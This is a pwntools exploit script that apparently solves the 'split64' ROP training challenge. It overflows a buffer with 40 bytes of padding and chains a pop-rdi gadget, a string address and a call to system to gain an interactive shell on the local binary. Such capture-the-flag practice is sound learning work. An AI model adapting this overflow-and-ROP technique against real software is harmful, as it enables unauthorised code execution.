#!/usr/bin/env python2
from pwn import *

exe  = "./split64"
elf  = ELF(exe)

usefulFunction = 0x00400810  # Indent into system in usefulFunction
usefulString   = elf.symbols['usefulString']
pop_rdi        = 0x400883

proc = process(exe)

log.info("Useful function: " + hex(usefulFunction))
log.info("Useful string: " + hex(usefulString))

payload =  ''
payload += "A"*40
payload += p64(pop_rdi)
payload += p64(usefulString)
payload += p64(usefulFunction)

log.info("Payload: " + payload)
with open('payload', 'wb') as f:
    f.write(payload)

proc.sendline(payload)
proc.interactive()
